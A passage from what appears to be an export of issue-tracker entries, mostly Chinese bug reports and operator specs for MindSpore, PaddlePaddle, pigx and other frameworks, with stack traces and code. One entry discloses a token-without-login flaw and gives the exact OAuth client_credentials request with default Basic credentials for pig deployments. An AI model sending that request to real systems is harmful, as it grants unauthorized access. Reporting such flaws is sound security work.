com.intellij.rt.execution.junit.TestsRepeater.repeat(TestsRepeater.java:11) at com.intellij.rt.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:35) at com.intellij.rt.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:235) at com.intellij.rt.junit.JUnitStarter.main(JUnitStarter.java:54)"
nn.Conv2d在使用DWConv的时候的dilation限制问题,"/ 硬件环境: /device ascend : -- MindSpore version :r1.3 -- Python version :3.7.5 -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph 使用DeepWiseConv2D in_channels = out_channels = group 运行神经网络模型   <code>: RuntimeError: ({'errCode': 'E67007', 'op_name': 'depthwise_conv2d_backprop_filter', 'param_name': 'dilation_h and dilation_w'}, 'In op[depthwise_conv2d_backprop_filter], the value of [dilation_h and dilation_w] must be equal to 1') RuntimeError: ({'errCode': 'E67007', 'op_name': 'depthwise_conv2d_backprop_filter', 'param_name': 'dilation_h and dilation_w'}, 'In op[depthwise_conv2d_backprop_filter], the value of [dilation_h and dilation_w] must be equal to 1')"
ruoyi-gateway和ruoyi-system监控显示down状态,原因是这两个项目的actuator 依赖没加   <code>: &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt;
layer.alert回调用不会自动关闭,"像这种情况，弹出提示后，点击确定回调后，提示还在，没有消失，一直点确定就一直回调这个函数。 难道必须每个都要加上这个吗？ layer.closeAll('dialog')   <code>: layer.alert('充值成功',{icon:1},function(){ $('#refresh').click(); })"
[CT][MS][switch_layer+D] testcases with control flow failed,"Ascend -- MindSpore version : vm+graph -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_parser_switch_layer_func_has_if test_parser_switch_layer_func_has_while 反向ok；正向场景前端处理级联relu算子设置的fullname相同，导致后端ub融合后的算子输出个数异常，需要前端分析fullname相同的问题   <code>: use_vm = not enable_ge or (enable_debug_runtime and context.get_context(""mode"") == context.PYNATIVE_MODE) &gt; result = self._executor.compile(obj, args_list, phase, use_vm) E RuntimeError: mindspore/ccsrc/backend/session/anf_runtime_algorithm.cc:538 GetOutputFormat] Node [kernel_graph_58:[CNode]222{[0]: ValueNode&lt;Primitive&gt; FusionOp_ReLU_ReLU, [1]: Φx}] has a invalid output format trace: E In file /root/archiconda3/envs/wh/lib/python3.7/site-packages/mindspore/nn/layer/activation.py(237)/ return self.relu(x)/ E In file /home/wanghua/MindTester/parse/test_parser_switch_layer.py(317)/ x = self.relu(x)/ E In file /home/wanghua/MindTester/parse/test_parser_switch_layer.py(75)/ x = self.funcs[i](inputsa, inputsb)/ E E E # /root/archiconda3/envs/wh/lib/python3.7/site-packages/mindspore/common/api.py:491: RuntimeError"
LStM,Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
incorrect logic of call once,The wrapper will always throw an error if it has been called once. https://github.com/PaddlePaddle/Paddle/blob/761b3297934c741aaa4d13130a3e0a31131506d5/paddle/platform/call_once.h#L30-L49   <code>: call_once
Implement fluid API using python with guard.,"change current implement to , , op implementation. implement python API with guard for build sample program using python with statement APIs. update document about this. According to https://github.com/PaddlePaddle/Paddle/blob/develop/doc/design/concurrent_programming.md#the-worker-program we need to implement similar API looks like: Server side: Worker side: If we are using CSP model, the server side may look like:   <code>: listen_and_serv send recv listen_and_serv loss = define_model() server = fluid.listen_and_serv() with server.do(): opt = fluid.optimizer.Adam() opt.minimize(loss) loss = define_model() params, grads = fluid.append_backward(loss) splited = layers.split(params, grads) with fluid.parallel_for(len(splited)) as iter: layers.send(splited[""grad""][iter.idx]) with fluid.parallel_for(len(splited)) as iter: layers.recv(splited[""param""][iter.idx]) layers.concat(splited[""param""]) loss = define_model() params, grads = fluid.append_backward(loss) param_ch = fluid.make_chan() param_recved_ch = fluid.make_chan() grad_ch = fluid.make_chan() layers.split_to_chan(params, param_ch) layers.split_to_chan(grads, grad_ch) with fluid.go(): layers.send(grad_ch) with fluid.go(): updated_param = layers.recv(param_ch) param_recved_ch.push(updated_param) layers.concat(param_recved_ch)"
feign调用异常处理,"环境信息 pigx版本: 4.1 是否修改包名: 否 提供详细 当前feign调用时被调用者触发任何异常都会让调用者走fallback方法! 建议补充Sentinel的属性忽略部分自定义异常, 方便调用时异常状态正常被调用者接收 我在类中对应的全局异常处理类上添加了一下代码: 不知是否合适!   <code>: exceptionsToIgnore GlobalBizExceptionHandler @ResponseStatus(HttpStatus.OK) @ExceptionHandler({ NormalException.class}) @SentinelResource(exceptionsToIgnore = NormalException.class) public Result&lt;String&gt; checkException(NormalException e) { log.info(""普通异常信息 ex={}"", e.getMessage()); return Result.failed(e.getLocalizedMessage()); }"
【众智】【计算-GPU开发】SparseToDense,"接口目录：mindspore/ops/operations/sparse_ops.py 接口参考库上： https://www.mindspore.cn/docs/api/zh-CN/r1.6/api_python/nn/mindspore.nn.SparseToDense.html?highlight=sparsetodense#mindspore.nn.SparseToDense indices output_shape values default_value y validate_indices bool 属性 对应底层算子 Classify Name Type Type Range Required INPUT indices int32, int64 TRUE INPUT output_shape int32, int64 TRUE INPUT values DT_INT8, DT_UINT8, DT_INT16, DT_UINT16, DT_INT32, DT_INT64, DT_FLOAT16, DT_FLOAT, DT_BOOL, DT_DOUBLE TRUE INPUT defualt_value DT_INT8, DT_UINT8, DT_INT16, DT_UINT16, DT_INT32, DT_INT64, DT_FLOAT16, DT_FLOAT, DT_BOOL, DT_DOUBLE TRUE OUTPUT y DT_INT8, DT_UINT8, DT_INT16, DT_UINT16,DT_INT32, DT_INT64, DT_FLOAT16, DT_FLOAT, DT_BOOL, DT_DOUBLE TRUE ATTR validate_indices bool bool FALSE 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/SparseToDense 3. 异常处理 4. 算子反向 Tensorflow: 参考https://github.com/tensorflow/tensorflow/tree/v2.6.2/tensorflow/python/ops/sparse_grad.py 中的 _SparseToDenseGrad反向算子   <code>: 将稀疏张量转换为稠密张量。 class SparseToDense(PrimitiveWithInfer):"
beetlsql3.0的SQLManagerCustomize怎么设置扩展属性,"我们之前的在beetlsql2时，有些项目对性能要求稍高些，会根据${spring.profiles.active}这个值来， 分环境来添加 PRODUCT_MODE = true。 现在我们的beetlsql3.0，似乎不能设置beetlsql扩展属性了。 只能在btsql-ext.properties中设置，但这样子却是不便于开发调试的。   <code>: import org.beetl.sql.core.SQLManager; import org.beetl.sql.starter.SQLManagerCustomize; public class SQLManagerCustomizeImpl implements SQLManagerCustomize{ @Override public void customize(String sqlManagerName, SQLManager manager) { } }"
paddle 训练报错 无显式提示信息,"paddle 版本：1.8.1   <code>: 2020-10-19 14:34:42,461-INFO: Steps: 1 Loss: [array([2.8835764], dtype=float32)] /home/users/maoseng/listwise_pointer_network/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/executor.py:1070: UserWarning: The following exception is not an EOF exception. ""The following exception is not an EOF exception."") Traceback (most recent call last): File ""listwise_pointer_network_dqn.py"", line 392, in &lt;module&gt; local_run_train_episode(agent, msd_dataset) File ""listwise_pointer_network_dqn.py"", line 179, in local_run_train_episode loss = agent.learn(data) File ""listwise_pointer_network_dqn.py"", line 142, in learn self.learn_program, feed=data, fetch_list=[self.cost]) File ""/home/users/maoseng/listwise_pointer_network/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 1071, in run six.reraise(*sys.exc_info()) File ""/home/users/maoseng/listwise_pointer_network/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 1066, in run return_merged=return_merged) File ""/home/users/maoseng/listwise_pointer_network/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 1154, in _run_impl use_program_cache=use_program_cache) File ""/home/users/maoseng/listwise_pointer_network/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 1229, in _run_program fetch_var_name) paddle.fluid.core_avx.EnforceNotMet: -------------------------------------------- C++ Call Stacks (More useful to developers): -------------------------------------------- 0 std::string paddle::platform::GetTraceBackString&lt;std::string const&amp;&gt;(std::string const&amp;, char const*, int) 1 paddle::platform::EnforceNotMet::EnforceNotMet(std::string const&amp;, char const*, int) 2 paddle::memory::detail::MemoryBlock::Split(paddle::memory::detail::MetadataCache*, unsigned long) 3 paddle::memory::detail::BuddyAllocator::SplitToAlloc(std::_Rb_tree_const_iterator&lt;std::tuple&lt;unsigned long, unsigned long, void*&gt; &gt;, unsigned long) 4 paddle::memory::detail::BuddyAllocator::Alloc(unsigned long) 5 void* paddle::memory::legacy::Alloc&lt;paddle::platform::CPUPlace&gt;(paddle::platform::CPUPlace const&amp;, unsigned long) 6 paddle::memory::allocation::NaiveBestFitAllocator::AllocateImpl(unsigned long) 7 paddle::memory::allocation::AllocatorFacade::Alloc(paddle::platform::Place const&amp;, unsigned long) 8 paddle::memory::allocation::AllocatorFacade::AllocShared(paddle::platform::Place const&amp;, unsigned long) 9 paddle::memory::AllocShared(paddle::platform::Place const&amp;, unsigned long) 10 paddle::framework::Tensor::mutable_data(paddle::platform::Place const&amp;, paddle::framework::proto::VarType_Type, unsigned long) 11 paddle::operators::MulGradKernel&lt;paddle::platform::CPUDeviceContext, float&gt;::Compute(paddle::framework::ExecutionContext const&amp;) const 12 std::_Function_handler&lt;void (paddle::framework::ExecutionContext const&amp;), paddle::framework::OpKernelRegistrarFunctor&lt;paddle::platform::CPUPlace, false, 0ul, paddle::operators::MulGradKernel&lt;paddle::platform::CPUDeviceContext, float&gt;, paddle::operators::MulGradKernel&lt;paddle::platform::CPUDeviceContext, double&gt; &gt;::operator()(char const*, char const*, int) const::{lambda(paddle::framework::ExecutionContext const&amp;)#1}&gt;::_M_invoke(std::_Any_data const&amp;, paddle::framework::ExecutionContext const&amp;) 13 paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;, paddle::framework::RuntimeContext*) const 14 paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;) const 15 paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;) 16 paddle::framework::Executor::RunPartialPreparedContext(paddle::framework::ExecutorPrepareContext*, paddle::framework::Scope*, long, long, bool, bool, bool) 17 paddle::framework::Executor::RunPreparedContext(paddle::framework::ExecutorPrepareContext*, paddle::framework::Scope*, bool, bool, bool) 18 paddle::framework::Executor::Run(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt; const&amp;, bool, bool) ------------------------------------------ Python Call Stacks (More useful to users): ------------------------------------------ File ""/home/users/maoseng/listwise_pointer_network/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/framework.py"", line 2610, in append_op attrs=kwargs.get(""attrs"", None)) File ""/home/users/maoseng/listwise_pointer_network/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/layer_helper.py"", line 43, in append_op return self.main_program.current_block().append_op(*args, **kwargs) File ""/home/users/maoseng/listwise_pointer_network/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/layers/nn.py"", line 1719, in fc ""y_num_col_dims"": 1}) File ""/home/users/maoseng/listwise_pointer_network_dqn/generator_network.py"", line 119, in _build_encoder bias_attr=ParamAttr(name='Generator_{}_init_hidden_fc_0.b_0'.format(variable_field))) #(batch, hidden_size) File ""/home/users/maoseng/listwise_pointer_network_dqn/generator_network.py"", line 224, in forward self._build_encoder(inputs, target=target) File ""listwise_pointer_network_dqn.py"", line 57, in learn c_Q = self.generator_model.forward(inputs, output_type='c_Q') File ""listwise_pointer_network_dqn.py"", line 112, in _build_net self.cost = self.generator_trainer.learn(self.data_list) File ""listwise_pointer_network_dqn.py"", line 80, in __init__ self._build_net() File ""listwise_pointer_network_dqn.py"", line 388, in &lt;module&gt; agent = GeneratorAgent(config, feat_list.features, args, msd_dataset) ---------------------- Error Message Summary: ---------------------- Error: An error occurred here. There is no accurate error hint for this error yet. We are continuously in the process of increasing hint for this kind of error check. It would be helpful if you could inform us of how this conversion went by opening a github issue. And we will resolve it with high priority. - New issue link: https://github.com/PaddlePaddle/Paddle/issues/new - Recommended issue content: all error stack information [Hint: Expected desc-&gt;total_size &gt;= size, but received desc-&gt;total_size:0 &lt; size:69632.] at (/paddle/paddle/fluid/memory/detail/memory_block.cc:41) [operator &lt; mul_grad &gt; error]"
infer输出的layer output顺序不符合预期,"做检索排序任务，需要衡量两个doc与query的相关性，并计算pairwise loss，模型相关部分如下： 模型能够完成训练，并在每轮训练中输出event结果。 保存模型后，在第2阶段载入模型，进行infer，相关代码如下： 输出的部分预测结果如下： rank_cost函数的定义在document中定义如下（经典的cross entropy pairwise loss）： 得到的rank_cost输出结果不符合预期： 预测错误时（result=0），loss不应该为负数； 在其他case中，预测正确了（result=1），loss为正数时，也与上述公式的计算结果不同。   <code>: sim_1 = paddle.layer.cos_sim(a=query_vector, b=title_1_vector, name='cosine_1') sim_2 = paddle.layer.cos_sim(a=query_vector, b=title_2_vector, name='cosine_2') cost = paddle.layer.rank_cost( left=sim_1, right=sim_2, label=label_data, ) infer = paddle.inference.Inference(output_layer=[cost, sim_1, sim_2], parameters=parameters) for item in train_reader(): item = list(item) infer_data = [item[0:4]] # infer_data=[[[2, 3], [1, 2, 3], [1, 2, 3], 0]] output = infer.infer( input=infer_data, feeding=feeding, field=[""value""], # flatten_result=False, ) cost = output[0][0] s1 = output[1][0] s2 = output[2][0] label = item[3] result = ((s1 - s2) &gt; 0) == label print '%.4f\t%.4f\t%.4f\t%d\t%d' % (cost, s1, s2, label, result) -0.4013 -0.0975 0.5527 0 1 -0.0975 -0.1557 0.6645 1 0 -0.1552 -0.4013 0.5777 1 0 -0.1557 -0.1552 0.6929 0 1 -0.4013 -0.2339 0.6129 0 1 -0.1557 -0.2339 0.7330 0 1 -0.2383 -0.4128 0.6097 1 0 C_{i,j} &amp; = -\\tilde{P_{ij}} * o_{i,j} + log(1 + e^{o_{i,j}})"
中文pdf预览问题,中文pdf预览报错， 将相同的pdf文件名改成英文，即可成功预览。请问，如何解决？   <code>: PDF.js v1.10.88 (build: c62a1938) 信息：PDFDocument: stream must have data
"[CT][MS][Ldexp] Ldexp has some problems at cpu,gpu,asend","在cpu等三种环境，两种模式下 运行 test_ldexp_input_x1_dtype_float16_0d用例 def test_ldexp_input_x1_dtype_float16_0d(): input_list = [] x0 = Tensor(np.random.randn(42, 20).astype(np.float16)) input_list.append(x0) x1 = Tensor(np.random.randn(), dtype=mstype.int16) input_list.append(x1) fact = LdexpMock(inputs=input_list) fact.forward_cmp() 出现类型错误 test_ldexp_input_x1_dtype_float16_0d ascend 类型支持 用例通过   <code>: fact.grad_cmp()"
【校验组】支持 JSR 303分组校验ValidGroup,环境信息 pigx版本: 4.4 是否修改包名: 否 提供详细   <code>: package com.pig4cloud.pigx.common.core.util; /** * 校验类型 * * @author lengleng * @date 2022/4/26 */ public class ValidGroup { /** * 插入组 * * @author lengleng * @date 2022/4/26 */ public static interface Insert { } /** * 编辑组 * * @author lengleng * @date 2022/4/26 */ public static interface Update { } }
4.1.3 下载文件OSS 出问题了,You have no right to access this object because of bucket acl. 62E890BB1AFF6531381EC2CA pdmaner-release.oss-cn-hangzhou.aliyuncs.com   <code>: AccessDenied
Table组件加载时抛出异常,Table组件加载时抛出异常，找了很久都没发现原因。 at Microsoft.AspNetCore.Components.ComponentBase.RunInitAndSetParametersAsync () &lt;0x2f6ea28 + 0x0013a&gt; in :0   <code>: 1[TItem].QueryData () [0x00040] in C:\Users\***\BootstrapBlazor\Components\Table\TableBase_Edit.cs:140 at BootstrapBlazor.Components.TableBase
validate并非数据库关键字，为什么输出的时候必须加中括号 如：[validate] 否则会报错。,"我测试了 3.0 版本，3.1 版本 都报错。 log4j:WARN No appenders could be found for logger (com.alibaba.druid.pool.DruidDataSource). log4j:WARN Please initialize the log4j system properly. log4j:WARN See http://logging.apache.org/log4j/1.2/faq.html#noconfig for more info. [22:11:35.146][DEBUG][c.g.dao.ChemSellMapper.selectPage][main] ==&gt; Preparing: SELECT COUNT(1) FROM ( SELECT id,validate FROM chem_sell ORDER BY id DESC ) TOTAL [22:11:35.303][DEBUG][c.g.dao.ChemSellMapper.selectPage][main] ==&gt; Parameters: Exception in thread ""main"" org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.exceptions.PersistenceException: Error querying database. Cause: com.baomidou.mybatisplus.core.exceptions.MybatisPlusException: Error: Method queryTotal execution error of sql : SELECT COUNT(1) FROM ( SELECT id,validate FROM chem_sell ORDER BY id DESC ) TOTAL The error may exist in com/guidechem/dao/ChemSellMapper.java (best guess) The error may involve defaultParameterMap The error occurred while setting parameters Cause: com.baomidou.mybatisplus.core.exceptions.MybatisPlusException: Error: Method queryTotal execution error of sql : SELECT COUNT(1) FROM ( SELECT id,validate FROM chem_sell ORDER BY id DESC ) TOTAL Caused by: org.apache.ibatis.exceptions.PersistenceException: Error querying database. Cause: com.baomidou.mybatisplus.core.exceptions.MybatisPlusException: Error: Method queryTotal execution error of sql : SELECT COUNT(1) FROM ( SELECT id,validate FROM chem_sell ORDER BY id DESC ) TOTAL The error may exist in com/guidechem/dao/ChemSellMapper.java (best guess) The error may involve defaultParameterMap The error occurred while setting parameters Cause: com.baomidou.mybatisplus.core.exceptions.MybatisPlusException: Error: Method queryTotal execution error of sql : SELECT COUNT(1) FROM ( SELECT id,validate FROM chem_sell ORDER BY id DESC ) TOTAL Caused by: com.baomidou.mybatisplus.core.exceptions.MybatisPlusException: Error: Method queryTotal execution error of sql : SELECT COUNT(1) FROM ( SELECT id,validate FROM chem_sell ORDER BY id DESC ) TOTAL Caused by: com.microsoft.sqlserver.jdbc.SQLServerException: 除非另外还指定了 TOP、OFFSET 或 FOR XML，否则，ORDER BY 子句在视图、内联函数、派生表、子查询和公用表表达式中无效。 at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDatabaseError(SQLServerException.java:196) at com.microsoft.sqlserver.jdbc.SQLServerStatement.getNextResult(SQLServerStatement.java:1454) at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.doExecutePreparedStatement(SQLServerPreparedStatement.java:388) at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement$PrepStmtExecCmd.doExecute(SQLServerPreparedStatement.java:338) at com.microsoft.sqlserver.jdbc.TDSCommand.execute(IOBuffer.java:4026) at com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(SQLServerConnection.java:1416) at com.microsoft.sqlserver.jdbc.SQLServerStatement.executeCommand(SQLServerStatement.java:185) at com.microsoft.sqlserver.jdbc.SQLServerStatement.executeStatement(SQLServerStatement.java:160) at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.executeQuery(SQLServerPreparedStatement.java:281) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_executeQuery(FilterChainImpl.java:2784) at com.alibaba.druid.filter.FilterEventAdapter.preparedStatement_executeQuery(FilterEventAdapter.java:465) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_executeQuery(FilterChainImpl.java:2781) at com.alibaba.druid.proxy.jdbc.PreparedStatementProxyImpl.executeQuery(PreparedStatementProxyImpl.java:150) at com.alibaba.druid.pool.DruidPooledPreparedStatement.executeQuery(DruidPooledPreparedStatement.java:227) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.apache.ibatis.logging.jdbc.PreparedStatementLogger.invoke(PreparedStatementLogger.java:56) at com.sun.proxy.$Proxy28.executeQuery(Unknown Source) at com.baomidou.mybatisplus.extension.plugins.PaginationInterceptor.queryTotal(PaginationInterceptor.java:199) ... 38 more   <code>: @Override public IPage&lt;ChemSell&gt; listChemSell(IPage&lt;ChemSell&gt; page) { QueryWrapper&lt;ChemSell&gt; wrapper = new QueryWrapper&lt;ChemSell&gt;(); wrapper.select(""id,validate""); wrapper.orderByDesc(""id""); page = this.page(page,wrapper); return page; } at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:77) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:446) at com.sun.proxy.$Proxy20.selectList(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:230) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.executeForIPage(MybatisMapperMethod.java:125) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.execute(MybatisMapperMethod.java:94) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy.invoke(MybatisMapperProxy.java:61) at com.sun.proxy.$Proxy21.selectPage(Unknown Source) at com.baomidou.mybatisplus.extension.service.impl.ServiceImpl.page(ServiceImpl.java:277) at com.guidechem.service.impl.ChemSellServiceImpl.listChemSell(ChemSellServiceImpl.java:28) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:333) at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:207) at com.sun.proxy.$Proxy24.listChemSell(Unknown Source) at com.guidechem.generator.Test.main(Test.java:30) at org.apache.ibatis.exceptions.ExceptionFactory.wrapException(ExceptionFactory.java:30) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:150) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:141) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:433) ... 16 more at com.baomidou.mybatisplus.core.toolkit.ExceptionUtils.mpe(ExceptionUtils.java:39) at com.baomidou.mybatisplus.extension.plugins.PaginationInterceptor.queryTotal(PaginationInterceptor.java:214) at com.baomidou.mybatisplus.extension.plugins.PaginationInterceptor.intercept(PaginationInterceptor.java:168) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:61) at com.sun.proxy.$Proxy26.prepare(Unknown Source) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:63) at com.sun.proxy.$Proxy26.prepare(Unknown Source) at org.apache.ibatis.executor.SimpleExecutor.prepareStatement(SimpleExecutor.java:86) at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:62) at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:324) at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:156) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:109) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:83) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:148) ... 22 more"
generate_proposals_op网络定义阶段与运行阶段的lod_level不一致,"generate_proposals_op.cc: 这部分代码，未设置lodlevel，导致输出的LodLevel为0。但计算图执行时，其输出附有lod_level=1的lod info. 因此，网络定义阶段，对RpnRrois及无法使用sequence_pool等lodTensor相关的算子进行处理。   <code>: void InferShape(framework::InferShapeContext *ctx) const override { PADDLE_ENFORCE_EQ( ctx-&gt;HasInput(""Scores""), true, platform::errors::NotFound(""Input(Scores) shouldn't be null."")); PADDLE_ENFORCE_EQ( ctx-&gt;HasInput(""BboxDeltas""), true, platform::errors::NotFound(""Input(BboxDeltas) shouldn't be null."")); PADDLE_ENFORCE_EQ( ctx-&gt;HasInput(""ImInfo""), true, platform::errors::NotFound(""Input(ImInfo) shouldn't be null."")); PADDLE_ENFORCE_EQ( ctx-&gt;HasInput(""Anchors""), true, platform::errors::NotFound(""Input(Anchors) shouldn't be null."")); PADDLE_ENFORCE_EQ( ctx-&gt;HasInput(""Variances""), true, platform::errors::NotFound(""Input(Variances) shouldn't be null."")); ctx-&gt;SetOutputDim(""RpnRois"", {-1, 4}); ctx-&gt;SetOutputDim(""RpnRoiProbs"", {-1, 1}); }"
帖子内容使用Unicode编码会出现直接显示源码问题,"source\function\function_core.php 下面加入 怎么不生效了呢？   <code>: $string = str_replace(array('&amp;', '""', '&lt;', '&gt;'), array('&amp;amp;', '&amp;quot;', '&amp;lt;', '&amp;gt;'), $string); if(strpos($string, '&amp;#') !== false) { $string = preg_replace('/&amp;((#(\d{3,5}|x[a-fA-F0-9]{4}));)/', '&amp;\\1', $string); }"
JSONNull这个对象Jackson不识别,JDK版本： openjdk_8_201 hutool版本： 5.7.2   <code>: return WebResponse.success(report); //report 里面包含JSONNull导致无法序列化
[ST][MS/modelzoo][NET][naml][ascend] 目录命名不规范,models/naml/script目录 应遵循规范改为 scripts / 硬件环境: /device ascend : -- MindSpore version :r1.9 commit_id:4e8cc723 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220810 MindSpore 版本：编译时间202209 r1.9.0 commit_id:c915f9ed (/): /mode graph test_ms_naml_ascend_train_check_fps_0001.py cd solution_test/cases/02network/00cv/crnn/train/ pytest -s test_ms_naml_ascend_train_check_fps_0001.py models/naml/script目录 应遵循规范改为 scripts 走给安正气   <code>: models/naml/script目录 应遵循规范改为 scripts
【众智】【计算-AICPU开发】CTCBeamSearchDecoder,"计算-AICPU开发 输出是动态shape，对输入中给定的logits执行beam搜索解码。 接口目录：mindspore/ops/operation/nn_ops..py inputs sequence_length decoded_indices tuple(Tensor) decoded_values tuple(Tensor) decoded_shape tuple(Tensor) log_probability beam_width int 属性 top_paths int 属性 merge_repeated bool 属性 对应底层算子 对应底层AICPU算子CTCBeamSearchDecoder 标杆接口参考 TF接口： https://www.tensorflow.org/versions/r2.3/api_docs/python/tf/raw_ops/CTCBeamSearchDecoder tf.raw_ops.CTCBeamSearchDecoder(inputs, sequence_length, beam_width, top_paths, merge_repeated=True, name=None) 3. 异常处理 4. 算子反向 无反向   <code>: class CTCBeamSearchDecoder(Primitive): REG_OP(CTCBeamSearchDecoder) .INPUT(inputs, TensorType({DT_FLOAT, DT_DOUBLE})) .INPUT(sequence_length, TensorType({DT_INT32})) .REQUIRED_ATTR(beam_width, Int) .REQUIRED_ATTR(top_paths, Int) .ATTR(merge_repeated, Bool, true) .DYNAMIC_OUTPUT(decoded_indices, TensorType({DT_INT64})) .DYNAMIC_OUTPUT(decoded_values, TensorType({DT_INT64})) .DYNAMIC_OUTPUT(decoded_shape, TensorType({DT_INT64})) .OUTPUT(log_probability, TensorType({DT_FLOAT, DT_DOUBLE})) .OP_END_FACTORY_REG(CTCBeamSearchDecoder)"
【众智】【计算-TBE接入】ApplyAdagradDAD,"优化器类算子，根据AdagraDA方案更新输入参数。 接口目录：mindspore/ops/operations/nn_ops.py use_locking bool 属性 var Parameter gradient_accumulator Parameter gradient_squared_accumulator Parameter grad lr Number/Tensor l1 Number/Tensor l2 Number/Tensor global_step Number/Tensor var Number/Tensor gradient_accumulator gradient_squared_accumulator 对应底层算子 对应底层AI Core算子ApplyAdagradDAD：   <code>: grad_accum += grad grad_squared_accum += grad * grad tmp_val=sign(grad_accum) * max{|grad_accum|-l1*global_step, 0} if l1&gt;0 else grad_accum x_value = -1 * lr * tmp_val y_value = l2 * global_step * lr + sqrt(grad_squared_accum) var = x_value / y_value class ApplyAdagradDA(Primitive):"
不用登陆也可以获取token，原因我就不说了 ，程序写的太呆,http://127.0.0.1:3001/oauth/token?grant_type=client_credentials&amp;scope=server 另外请求头加上 Authorization Basic cGlnOnBpZw== 是的你没看错 访问这个接口你就可以得到token，pig那个冷冷天天吹牛，还说我们是伸手党，之前我的评论都被删除了，你这个系统就一个权限，结果不用登陆就可以访问 ，强啊！lengleng   <code>: ----希望这条宝贵的意见被采纳
"[CT][MS][OCCM][SparseSlice]Grad  report ""input_data can not contain zero dimension"" sometimes","Ascend与GPU后端， SparseSlice算子反向计算报错input_data can not contain zero dimension / 硬件环境: /device ascend/CPU : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行测试用例 (Mandatory / 必填 正反向计算结果正确， 对标通过   <code>: def test_p_sparseslice_512x4_int16(): input_indices = Tensor(np.random.randint(1, 124, size=(512, 4)).astype(np.int64)) input_values = Tensor(np.random.randint(1, 1024, size=(512,)).astype(np.int16)) input_shape = Tensor(np.random.randint(1024, 2048, size=(4,)).astype(np.int64)) input_start = Tensor(np.random.randint(1, 26, size=(4,)).astype(np.int64)) input_size = Tensor(np.random.randint(1000, 1024, size=(4,)).astype(np.int64)) fact = SparseSliceMock( inputs=[input_indices, input_values, input_shape, input_start, input_size]) fact.forward_cmp() fact.grad_cmp() def test_p_sparseslice_indices_0(): input_indices = Tensor([[0, 1], [1, 2], [1, 3], [2, 2]], 